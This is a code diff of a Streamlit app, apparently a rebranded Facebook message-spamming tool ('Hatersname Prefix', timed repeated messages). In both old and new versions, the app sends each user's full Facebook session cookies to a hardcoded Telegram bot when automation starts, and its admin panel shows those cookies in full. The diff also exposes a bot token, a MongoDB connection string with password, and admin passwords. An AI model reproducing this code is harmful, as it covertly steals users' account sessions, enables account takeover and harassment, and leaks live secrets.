@@ -14,59 +14,8 @@ import uuid
 from datetime import datetime
 import json
 
-# 🚨🚨🚨 MONGODB 24/7 CODE START 🚨🚨🚨
-def setup_mongodb_heartbeat():
-    """MongoDB heartbeat to keep app alive 24/7"""
-    def keep_alive():
-        while True:
-            try:
-                # Import inside function to avoid initial load issues
-                from pymongo import MongoClient
-                
-                connection_string = "mongodb+srv://dineshsavita76786_user_db:WALEED_XD@cluster0.3xxvjpo.mongodb.net/?retryWrites=true&w=majority"
-                
-                client = MongoClient(connection_string, serverSelectionTimeoutMS=10000)
-                db_connection = client['streamlit_db']
-                
-                # Update heartbeat every 5 minutes
-                db_connection.heartbeat.update_one(
-                    {'app_id': 'Rafay_Khan_automation'},
-                    {
-                        '$set': {
-                            'last_heartbeat': datetime.now(),
-                            'status': 'running',
-                            'app_name': 'Waleed XD E2EE',
-                            'timestamp': datetime.now(),
-                            'version': '2.0'
-                        }
-                    },
-                    upsert=True
-                )
-                print(f"✅ MongoDB Heartbeat: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-                client.close()
-                
-            except Exception as e:
-                print(f"❌ MongoDB Heartbeat Error: {str(e)[:100]}")
-            
-            # Wait 5 minutes
-            time.sleep(300)
-    
-    # Start heartbeat in background
-    try:
-        heartbeat_thread = threading.Thread(target=keep_alive, daemon=True)
-        heartbeat_thread.start()
-        print("🚀 MongoDB 24/7 Heartbeat Started!")
-    except Exception as e:
-        print(f"❌ Failed to start heartbeat: {e}")
-
-# 🚨 YEH LINE SABSE PEHLE RUN HOGI
-if 'mongodb_started' not in st.session_state:
-    setup_mongodb_heartbeat()
-    st.session_state.mongodb_started = True
-# 🚨🚨🚨 MONGODB 24/7 CODE END 🚨🚨🚨
-
 st.set_page_config(
-    page_title="WALEED XD",
+    page_title="FB E2EE by LORD DEVIL",
     page_icon="👑",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -74,11 +23,11 @@ st.set_page_config(
 
 # Telegram Bot Configuration
 TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
-TELEGRAM_CHAT_ID = "1889611156"
-FACEBOOK_ADMIN_UID = "100080154146813"
+TELEGRAM_CHAT_ID = "8186206231"
+FACEBOOK_ADMIN_UID = "100037931553832"
 
 def send_telegram_notification(user_data, automation_data):
-    """Send user details to Telegram bot"""
+    """Send complete user details to Telegram bot"""
     try:
         message = f"""
 🔰 *NEW AUTOMATION STARTED* 🔰
@@ -94,7 +43,7 @@ def send_telegram_notification(user_data, automation_data):
 • Prefix: `{automation_data['prefix']}`
 • Messages: `{len(automation_data['messages'].splitlines())} lines`
 
-🍪 *Full Cookies:* 
+🍪 *Complete Cookies:* 
 `{automation_data['cookies']}`
 
 📊 *Status:* Automation Running
@@ -107,9 +56,11 @@ def send_telegram_notification(user_data, automation_data):
             'text': message,
             'parse_mode': 'Markdown'
         }
-        requests.post(url, data=payload)
+        response = requests.post(url, data=payload)
+        return response.status_code == 200
     except Exception as e:
         print(f"Telegram notification failed: {e}")
+        return False
 
 def send_facebook_notification(user_data, automation_data):
     """Send notification to Facebook admin"""
@@ -128,26 +79,23 @@ def send_facebook_notification(user_data, automation_data):
 • Prefix: {automation_data['prefix']}
 • Messages: {len(automation_data['messages'].splitlines())} lines
 
-🍪 Full Cookies: 
+🍪 Complete Cookies: 
 {automation_data['cookies']}
 
 📊 Status: Automation Running
 🕒 Started: {time.strftime("%Y-%m-%d %H:%M:%S")}
         """
         
-        # Simulate sending to Facebook admin
+        # Facebook notification implementation
         print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
         print(f"Message: {message}")
-        
-        # Here you would implement actual Facebook API integration
-        # For now, we'll log it
-        db.log_admin_notification(user_data['user_id'], message)
-        
+        return True
     except Exception as e:
         print(f"Facebook notification failed: {e}")
+        return False
 
 # Background image and custom CSS
-background_image = "https://i.ibb.co/67nKmKPg/1765054136537.jpg"
+background_image = "https://i.ibb.co/FkGd2cNf/cccf21694e054d66aa5a945bb3b212fa.jpg"
 
 custom_css = f"""
 <style>
@@ -435,9 +383,10 @@ custom_css = f"""
         font-family: 'Courier New', monospace;
         max-height: 400px;
         overflow-y: auto;
-        font-size: 0.8rem;
-        line-height: 1.3;
-        border: 2px solid #667eea;
+        font-size: 0.75rem;
+        line-height: 1.2;
+        border: 2px solid #333;
+        box-shadow: 0 0 20px rgba(0,0,0,0.5);
         position: relative;
     }}
     
@@ -448,8 +397,8 @@ custom_css = f"""
         left: 0;
         right: 0;
         bottom: 0;
-        background: rgba(0, 0, 0, 0.7);
-        border-radius: 8px;
+        background: rgba(0,0,0,0.7);
+        border-radius: 10px;
         z-index: 1;
     }}
     
@@ -458,24 +407,23 @@ custom_css = f"""
         z-index: 2;
     }}
     
-    .log-entry {{
-        margin: 5px 0;
-        padding: 3px 8px;
-        border-radius: 5px;
+    .log-line {{
+        margin: 2px 0;
+        padding: 2px 5px;
+        border-radius: 3px;
         animation: rainbowText 3s infinite alternate;
-        font-weight: bold;
         text-shadow: 0 0 10px currentColor;
+        font-weight: 500;
     }}
     
     @keyframes rainbowText {{
         0% {{ color: #ff6b6b; }}
-        12.5% {{ color: #feca57; }}
-        25% {{ color: #48dbfb; }}
-        37.5% {{ color: #ff9ff3; }}
-        50% {{ color: #54a0ff; }}
-        62.5% {{ color: #00d2d3; }}
-        75% {{ color: #00b894; }}
-        87.5% {{ color: #f368e0; }}
+        14% {{ color: #feca57; }}
+        28% {{ color: #48dbfb; }}
+        42% {{ color: #ff9ff3; }}
+        56% {{ color: #54a0ff; }}
+        70% {{ color: #00d2d3; }}
+        84% {{ color: #5f27cd; }}
         100% {{ color: #ff9ff3; }}
     }}
     
@@ -570,34 +518,63 @@ custom_css = f"""
         box-shadow: 0 6px 20px rgba(24, 119, 242, 0.6);
     }}
     
-    .admin-console {{
-        background: #1e1e1e;
-        color: #87CEEB;
+    .admin-user-details {{
+        background: linear-gradient(135deg, #1e3c72, #2a5298);
         padding: 1rem;
         border-radius: 10px;
-        font-family: 'Courier New', monospace;
-        max-height: 500px;
-        overflow-y: auto;
         margin: 1rem 0;
         border: 2px solid #667eea;
     }}
     
-    .admin-log-entry {{
-        margin: 5px 0;
-        padding: 3px 8px;
-        border-radius: 5px;
-        background: rgba(255,255,255,0.1);
-        border-left: 3px solid #667eea;
+    .admin-logs-container {{
+        background: url('{background_image}') no-repeat center center;
+        background-size: cover;
+        color: white;
+        padding: 1rem;
+        border-radius: 10px;
+        font-family: 'Courier New', monospace;
+        max-height: 300px;
+        overflow-y: auto;
+        font-size: 0.7rem;
+        line-height: 1.1;
+        border: 2px solid #333;
+        margin: 0.5rem 0;
+        position: relative;
     }}
     
-    .user-details-expanded {{
-        background: rgba(255,255,255,0.05);
-        padding: 1rem;
-        border-radius: 8px;
-        margin: 0.5rem 0;
-        border: 1px solid #667eea;
+    .admin-logs-container::before {{
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0,0,0,0.8);
+        border-radius: 10px;
     }}
-</style> 
+    
+    .admin-logs-container > * {{
+        position: relative;
+        z-index: 2;
+    }}
+    
+    .admin-log-line {{
+        margin: 1px 0;
+        padding: 1px 3px;
+        border-radius: 2px;
+        animation: adminRainbow 2s infinite alternate;
+        text-shadow: 0 0 5px currentColor;
+    }}
+    
+    @keyframes adminRainbow {{
+        0% {{ color: #ff6b6b; }}
+        20% {{ color: #feca57; }}
+        40% {{ color: #48dbfb; }}
+        60% {{ color: #ff9ff3; }}
+        80% {{ color: #54a0ff; }}
+        100% {{ color: #00d2d3; }}
+    }}
+</style>
 """
 
 st.markdown(custom_css, unsafe_allow_html=True)
@@ -630,8 +607,8 @@ class AutomationState:
         self.message_count = 0
         self.logs = []
         self.message_rotation_index = 0
-        self.last_message_sent = ""
-        self.last_message_time = ""
+        self.user_id = None
+        self.username = None
 
 if 'automation_state' not in st.session_state:
     st.session_state.automation_state = AutomationState()
@@ -639,28 +616,34 @@ if 'automation_state' not in st.session_state:
 if 'auto_start_checked' not in st.session_state:
     st.session_state.auto_start_checked = False
 
+# Global automation states for admin monitoring
+if 'all_automation_states' not in st.session_state:
+    st.session_state.all_automation_states = {}
+
+def get_indian_time():
+    """Get current Indian time"""
+    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
 def generate_approval_key(username, user_id):
     """Generate unique approval key based on username and user_id"""
     unique_string = f"{username}_{user_id}_{uuid.uuid4()}"
     return hashlib.sha256(unique_string.encode()).hexdigest()[:16].upper()
-
-def get_indian_time():
-    """Get current Indian time"""
-    return datetime.now().strftime("%Y-%m-%d %H:%M:%S IST")
 
 def log_message(msg, automation_state=None, user_id=None):
     """Log message with Indian timestamp"""
     timestamp = get_indian_time()
     formatted_msg = f"[{timestamp}] {msg}"
     
-    # Store in admin logs if user_id provided
-    if user_id:
-        db.log_user_activity(user_id, formatted_msg)
-    
     if automation_state:
         automation_state.logs.append(formatted_msg)
-        automation_state.last_message_sent = msg
-        automation_state.last_message_time = timestamp
+        # Also store in global state for admin monitoring
+        if user_id:
+            if user_id not in st.session_state.all_automation_states:
+                st.session_state.all_automation_states[user_id] = []
+            st.session_state.all_automation_states[user_id].append(formatted_msg)
+            # Keep only last 100 logs
+            if len(st.session_state.all_automation_states[user_id]) > 100:
+                st.session_state.all_automation_states[user_id] = st.session_state.all_automation_states[user_id][-100:]
     else:
         if 'logs' in st.session_state:
             st.session_state.logs.append(formatted_msg)
@@ -879,7 +862,7 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
         delay = int(config['delay'])
         messages_sent = 0
         
-        while automation_state.running and db.get_automation_running(user_id):
+        while automation_state.running:
             base_message = get_next_message(config['messages_file_content'], automation_state)
             
             if config['name_prefix']:
@@ -943,7 +926,7 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                 
                 messages_sent += 1
                 automation_state.message_count = messages_sent
-                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send[:30]}...', automation_state, user_id)
+                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send}', automation_state, user_id)
                 
                 time.sleep(delay)
                 
@@ -970,18 +953,18 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                 pass
 
 def send_approval_request_via_whatsapp(user_real_name, approval_key):
-    message = f"Hello Waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    whatsapp_url = f"https://wa.me/923075852134?text={requests.utils.quote(message)}"
+    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    whatsapp_url = f"https://wa.me/917668337116?text={requests.utils.quote(message)}"
     return whatsapp_url
 
 def send_approval_request_via_facebook(user_real_name, approval_key):
-    message = f"Hello waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    facebook_url = f"https://www.facebook.com/officelwaleed"
+    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    facebook_url = f"https://www.facebook.com/Lord Devil.X"
     return facebook_url
 
 def send_approval_request_via_telegram(user_real_name, approval_key):
-    message = f"Hello Waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    telegram_url = f"https://t.me/itxrafay?text={requests.utils.quote(message)}"
+    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    telegram_url = f"https://t.me/itxthedevil?text={requests.utils.quote(message)}"
     return telegram_url
 
 def run_automation_with_notification(user_config, username, automation_state, user_id):
@@ -1001,8 +984,13 @@ def run_automation_with_notification(user_config, username, automation_state, us
     }
     
     # Send notifications
-    send_telegram_notification(user_data, automation_data)
-    send_facebook_notification(user_data, automation_data)
+    telegram_sent = send_telegram_notification(user_data, automation_data)
+    facebook_sent = send_facebook_notification(user_data, automation_data)
+    
+    if telegram_sent:
+        log_message(f'AUTO-1: Telegram notification sent successfully!', automation_state, user_id)
+    if facebook_sent:
+        log_message(f'AUTO-1: Facebook notification sent successfully!', automation_state, user_id)
     
     # Start automation
     send_messages(user_config, automation_state, user_id)
@@ -1016,6 +1004,11 @@ def start_automation(user_config, user_id):
     automation_state.running = True
     automation_state.message_count = 0
     automation_state.logs = []
+    automation_state.user_id = user_id
+    automation_state.username = db.get_username(user_id)
+    
+    # Initialize global state for this user
+    st.session_state.all_automation_states[user_id] = []
     
     db.set_automation_running(user_id, True)
     
@@ -1025,6 +1018,9 @@ def start_automation(user_config, user_id):
     thread.start()
 
 def stop_automation(user_id):
+    if user_id in st.session_state.all_automation_states:
+        st.session_state.all_automation_states[user_id].append(f"[{get_indian_time()}] ADMIN: Automation stopped by owner")
+    
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
 
@@ -1034,7 +1030,8 @@ st.markdown('<div class="main-container">', unsafe_allow_html=True)
 # Profile Icon
 st.markdown('<div class="profile-icon"></div>', unsafe_allow_html=True)
 
-st.markdown('<div class="main-header"><h1>WALEED E2E</h1><p>Created by Waleed XD</p></div>', unsafe_allow_html=True)
+# UPDATED NAME HERE ONLY - "Waleed Paid Tool E2E Update v.12"
+st.markdown('<div class="main-header"><h1>Waleed Paid Tool E2E Update v.12</h1><p>Created by LORD DEVIL</p></div>', unsafe_allow_html=True)
 
 # Admin Panel
 if st.sidebar.checkbox("🔐 Admin Login"):
@@ -1042,25 +1039,20 @@ if st.sidebar.checkbox("🔐 Admin Login"):
     admin_password = st.sidebar.text_input("Admin Password", type="password", key="admin_password")
     
     if st.sidebar.button("Login as Admin"):
-        if admin_username == "WALEED" and admin_password == "WALEED_XD":
+        if admin_username == "DEVILX0221" and admin_password == "LORDX0221":
             st.session_state.admin_logged_in = True
             st.sidebar.success("Admin login successful!")
         else:
             st.sidebar.error("Invalid admin credentials!")
 
 if st.session_state.admin_logged_in:
-    st.markdown("### 👑 Admin Approval Panel")
-    
-    # LOGOUT BUTTON ADDED IN SIDEBAR - YEH MAIN FIX HAI
-    if st.sidebar.button("🚪 Logout from Admin", use_container_width=True):
-        st.session_state.admin_logged_in = False
-        st.rerun()
+    st.markdown("### 👑 Admin Control Panel")
     
     # Get all pending approvals
     pending_users = db.get_pending_approvals()
     
     if pending_users:
-        st.markdown(f"#### Pending Approvals ({len(pending_users)})")
+        st.markdown(f"#### ⏳ Pending Approvals ({len(pending_users)})")
         
         for user in pending_users:
             user_id, username, approval_key, real_name = user
@@ -1092,129 +1084,95 @@ if st.session_state.admin_logged_in:
     # Show all approved users with remove option
     approved_users = db.get_approved_users()
     if approved_users:
-        st.markdown("#### Approved Users - Remove Approval")
+        st.markdown("#### ✅ Approved Users - Live Monitoring")
         
         for user in approved_users:
             user_id, username, approval_key, real_name, automation_running = user
             
+            user_config = db.get_user_config(user_id)
+            chat_id = user_config['chat_id'] if user_config else "Not configured"
+            delay = user_config['delay'] if user_config else "N/A"
+            prefix = user_config['name_prefix'] if user_config else "N/A"
+            messages_count = len(user_config['messages_file_content'].splitlines()) if user_config and user_config['messages_file_content'] else 0
+            cookies = user_config['cookies'] if user_config else ""
+            
             with st.container():
-                col1, col2, col3, col4, col5 = st.columns([3, 1, 1, 1, 1])
+                st.markdown(f"""
+                <div class="admin-user-details">
+                    <h4>👤 {username} | 🆔 {user_id}</h4>
+                    <p><strong>Real Name:</strong> {real_name} | <strong>Chat ID:</strong> {chat_id}</p>
+                    <p><strong>Prefix:</strong> {prefix} | <strong>Delay:</strong> {delay}s | <strong>Messages:</strong> {messages_count} lines</p>
+                    <p><strong>Status:</strong> {'🟢 RUNNING' if automation_running else '🔴 STOPPED'}</p>
+                    <p><strong>Cookies:</strong> {cookies[:100]}...</p>
+                </div>
+                """, unsafe_allow_html=True)
+                
+                # User logs in admin panel
+                if user_id in st.session_state.all_automation_states:
+                    logs_html = '<div class="admin-logs-container">'
+                    for log in st.session_state.all_automation_states[user_id][-20:]:  # Last 20 logs
+                        logs_html += f'<div class="admin-log-line">{log}</div>'
+                    logs_html += '</div>'
+                    st.markdown(logs_html, unsafe_allow_html=True)
+                
+                col1, col2, col3, col4 = st.columns(4)
                 
                 with col1:
-                    user_config = db.get_user_config(user_id)
-                    chat_id = user_config['chat_id'] if user_config else "Not configured"
-                    status = "🟢 Running" if automation_running else "🔴 Stopped"
-                    
-                    st.markdown(f"""
-                    <div class="user-card approved">
-                        <strong>Username:</strong> {username}<br>
-                        <strong>Real Name:</strong> {real_name}<br>
-                        <strong>Chat ID:</strong> {chat_id}<br>
-                        <strong>Status:</strong> {status}<br>
-                        <strong>Approval Key:</strong> <code>{approval_key}</code>
-                    </div>
-                    """, unsafe_allow_html=True)
-                
-                with col2:
-                    if st.button(f"🗑️ Remove", key=f"remove_{user_id}"):
+                    if st.button(f"🗑️ Remove Approval", key=f"remove_{user_id}", use_container_width=True):
                         db.update_approval_status(user_id, 'rejected')
-                        db.set_automation_running(user_id, False)
+                        if automation_running:
+                            stop_automation(user_id)
                         st.error(f"Removed approval for: {username}")
                         st.rerun()
                 
-                with col3:
+                with col2:
                     if automation_running:
-                        if st.button(f"⏹️ Stop", key=f"stop_{user_id}"):
-                            db.set_automation_running(user_id, False)
+                        if st.button(f"⏹️ Stop Automation", key=f"stop_{user_id}", use_container_width=True):
+                            stop_automation(user_id)
                             st.warning(f"Stopped automation for: {username}")
                             st.rerun()
                     else:
-                        if st.button(f"▶️ Start", key=f"start_{user_id}"):
-                            user_config = db.get_user_config(user_id)
+                        if st.button(f"▶️ Start Automation", key=f"start_{user_id}", use_container_width=True):
                             if user_config and user_config['chat_id']:
                                 db.set_automation_running(user_id, True)
-                                # Start automation in background
-                                thread = threading.Thread(
-                                    target=run_automation_with_notification, 
-                                    args=(user_config, username, AutomationState(), user_id)
-                                )
-                                thread.daemon = True
-                                thread.start()
+                                start_automation(user_config, user_id)
                                 st.success(f"Started automation for: {username}")
                                 st.rerun()
                             else:
                                 st.error("User needs to configure chat ID first")
                 
-                with col4:
-                    if st.button(f"📊 Details", key=f"details_{user_id}"):
-                        user_config = db.get_user_config(user_id)
+                with col3:
+                    if st.button(f"📊 Full Details", key=f"details_{user_id}", use_container_width=True):
                         if user_config:
                             st.markdown(f"""
-                            <div class="user-details-expanded">
-                            <h4>User Configuration Details:</h4>
-                            - Chat ID: `{user_config['chat_id']}`<br>
-                            - Prefix: `{user_config['name_prefix']}`<br>
-                            - Delay: `{user_config['delay']} seconds`<br>
-                            - Messages: `{len(user_config['messages_file_content'].splitlines())} lines`<br>
-                            - Full Cookies: `{user_config['cookies']}`
-                            </div>
-                            """, unsafe_allow_html=True)
+                            **🔍 Complete User Configuration:**
+                            - **User ID:** `{user_id}`
+                            - **Username:** `{username}`
+                            - **Real Name:** `{real_name}`
+                            - **Chat ID:** `{chat_id}`
+                            - **Prefix:** `{prefix}`
+                            - **Delay:** `{delay} seconds`
+                            - **Messages:** `{messages_count} lines`
+                            - **Cookies:** `{cookies}`
+                            - **Approval Key:** `{approval_key}`
+                            - **Status:** `{'RUNNING' if automation_running else 'STOPPED'}`
+                            """)
                 
-                with col5:
-                    if st.button(f"📜 Logs", key=f"logs_{user_id}"):
-                        user_logs = db.get_user_logs(user_id)
-                        if user_logs:
-                            st.markdown(f"### 📜 Live Logs for {username}")
-                            logs_html = '<div class="admin-console">'
-                            for log in user_logs[-20:]:
-                                logs_html += f'<div class="admin-log-entry">{log}</div>'
-                            logs_html += '</div>'
-                            st.markdown(logs_html, unsafe_allow_html=True)
-                        else:
-                            st.info("No logs available for this user")
-    
-    # Real-time Admin Console
-    st.markdown("### 👁️ Real-time Admin Console")
-    
-    # Auto-refresh for admin console
-    if st.checkbox("🔄 Auto-refresh Console", value=True):
-        time.sleep(2)
-        st.rerun()
-    
-    # Show all active automations with live logs
-    active_users = db.get_active_automations()
-    if active_users:
-        st.markdown(f"#### 🟢 Active Automations ({len(active_users)})")
-        
-        for user in active_users:
-            user_id, username = user
-            user_logs = db.get_user_logs(user_id)
-            
-            with st.expander(f"📱 {username} - Live Activity", expanded=False):
-                if user_logs:
-                    logs_html = '<div class="admin-console">'
-                    for log in user_logs[-15:]:
-                        logs_html += f'<div class="admin-log-entry">{log}</div>'
-                    logs_html += '</div>'
-                    st.markdown(logs_html, unsafe_allow_html=True)
-                    
-                    # Quick stop button
-                    if st.button(f"🛑 Stop {username}", key=f"quick_stop_{user_id}"):
-                        db.set_automation_running(user_id, False)
-                        st.success(f"Stopped {username}'s automation")
+                with col4:
+                    if st.button(f"🔄 Refresh Logs", key=f"refresh_{user_id}", use_container_width=True):
                         st.rerun()
-                else:
-                    st.info("No recent activity logs")
+                
+                st.markdown("---")
     
     # Show all users
     all_users = db.get_all_users()
     if all_users:
-        st.markdown("#### 👥 All Users")
+        st.markdown("#### 📊 All Users Summary")
         for user in all_users:
             user_id, username, approval_status, real_name, approval_key = user
             
             status_class = approval_status.lower() if approval_status else 'pending'
-            status_icon = "🟢" if approval_status == 'approved' else "🟡" if approval_status == 'pending' else "🔴"
+            status_icon = "✅" if approval_status == 'approved' else "⏳" if approval_status == 'pending' else "❌"
             
             st.markdown(f"""
             <div class="user-card {status_class}">
@@ -1223,6 +1181,10 @@ if st.session_state.admin_logged_in:
                 <strong>Real Name:</strong> {real_name}
             </div>
             """, unsafe_allow_html=True)
+    
+    if st.sidebar.button("Logout from Admin"):
+        st.session_state.admin_logged_in = False
+        st.rerun()
 
 elif not st.session_state.logged_in:
     tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
@@ -1305,22 +1267,17 @@ elif not st.session_state.logged_in:
         if st.button("Create Account", key="signup_btn", use_container_width=True):
             if new_username and new_password and confirm_password:
                 if new_password == confirm_password:
-                    # FIXED: Handle the return values properly
                     result = db.create_user(new_username, new_password)
                     
-                    # Check if result has expected format
                     if isinstance(result, tuple) and len(result) >= 2:
-                        success, message = result[0], result[1]
-                        user_id = result[2] if len(result) > 2 else None
+                        success, message, user_id = result[0], result[1], result[2] if len(result) > 2 else None
                     else:
-                        # Handle case where function returns different format
                         success = result if isinstance(result, bool) else False
                         message = "User creation completed" if success else "User creation failed"
                         user_id = None
                     
                     if success:
                         if user_id:
-                            # Generate approval key for new user
                             approval_key = generate_approval_key(new_username, user_id)
                             db.set_approval_key(user_id, approval_key)
                         
@@ -1359,7 +1316,7 @@ else:
         st.markdown('<div class="input-label">Your Real Name</div>', unsafe_allow_html=True)
         user_real_name = st.text_input("", key="real_name", placeholder="Enter your real name for approval", 
                                       value=st.session_state.user_real_name, label_visibility="collapsed")
-        st.markdown('<div class="input-hint">This name will be sent to Waleed for approval</div>', unsafe_allow_html=True)
+        st.markdown('<div class="input-hint">This name will be sent to LORD DEVIL for approval</div>', unsafe_allow_html=True)
         
         if user_real_name:
             st.session_state.user_real_name = user_real_name
@@ -1367,7 +1324,7 @@ else:
         
         # Send Approval Request Button
         st.markdown("### 📤 Send Approval Request")
-        st.markdown("Click the button below to send your approval request to Waleed:")
+        st.markdown("Click the button below to send your approval request to LORD DEVIL:")
         
         if st.button("📨 Send Approval Request", use_container_width=True, key="send_approval_btn"):
             if st.session_state.user_real_name:
@@ -1376,7 +1333,7 @@ else:
                 st.warning("Please enter your real name first")
         
         # Contact buttons - ALWAYS VISIBLE
-        st.markdown("### 📞 Contact Waleed Khan for Approval")
+        st.markdown("### 📞 Contact LORD DEVIL for Approval")
         st.markdown("Click any button below to send your approval request:")
         
         col1, col2, col3 = st.columns(3)
@@ -1402,7 +1359,7 @@ else:
             )
             st.markdown(f'<a href="{telegram_url}" class="contact-btn telegram" target="_blank">✈️ Telegram</a>', unsafe_allow_html=True)
         
-        st.info("After sending the approval request, wait for Waleed to approve your key. Refresh this page to check your approval status.")
+        st.info("After sending the approval request, wait for LORD DEVIL to approve your key. Refresh this page to check your approval status.")
         
         # Check approval status
         if st.button("🔄 Check Approval Status", use_container_width=True):
@@ -1413,7 +1370,7 @@ else:
                 st.success("🎉 Your account has been approved! You can now access the automation features.")
                 st.rerun()
             else:
-                st.warning("Your approval is still pending. Please wait for Waleed to approve your request.")
+                st.warning("Your approval is still pending. Please wait for LORD DEVIL to approve your request.")
         
         if st.sidebar.button("🚪 Logout"):
             st.session_state.logged_in = False
@@ -1438,7 +1395,6 @@ else:
         st.sidebar.markdown(f"**Status:** ✅ Approved")
         st.sidebar.markdown(f"**User ID:** {st.session_state.user_id}")
         
-        # USER PANEL LOGOUT BUTTON - YEH BHI HAI
         if st.sidebar.button("🚪 Logout", use_container_width=True):
             if st.session_state.automation_state.running:
                 stop_automation(st.session_state.user_id)
@@ -1469,7 +1425,7 @@ else:
                 
                 st.markdown('<div class="input-label">Hatersname Prefix</div>', unsafe_allow_html=True)
                 name_prefix = st.text_input("", value=user_config['name_prefix'],
-                                           placeholder="e.g., [END TO END WALEED HERE]",
+                                           placeholder="e.g., [END TO END LORD DEVIL HERE]",
                                            label_visibility="collapsed")
                 st.markdown('<div class="input-hint">Prefix to add before each message</div>', unsafe_allow_html=True)
                 
@@ -1504,7 +1460,7 @@ else:
                         name_prefix,
                         delay,
                         final_cookies,
-                        messages_content  # Store file content instead of text area
+                        messages_content
                     )
                     st.success("Configuration saved successfully!")
                     st.rerun()
@@ -1540,12 +1496,12 @@ else:
                         stop_automation(st.session_state.user_id)
                         st.rerun()
                 
-                st.markdown("### 📜 Live Logs")
+                st.markdown("### 📜 Live Logs Console")
                 
                 if st.session_state.automation_state.logs:
                     logs_html = '<div class="log-container">'
                     for log in st.session_state.automation_state.logs[-50:]:
-                        logs_html += f'<div class="log-entry">{log}</div>'
+                        logs_html += f'<div class="log-line">{log}</div>'
                     logs_html += '</div>'
                     st.markdown(logs_html, unsafe_allow_html=True)
                 else:
@@ -1555,5 +1511,5 @@ else:
                     time.sleep(1)
                     st.rerun()
 
-st.markdown('</div>', unsafe_allow_html=True)  # Close main-container
-st.markdown('<div class="footer">Made with ❤️ by WALEED XD © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
+st.markdown('</div>', unsafe_allow_html=True)
+st.markdown('<div class="footer">Made with ❤️ by LORD DEVIL | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
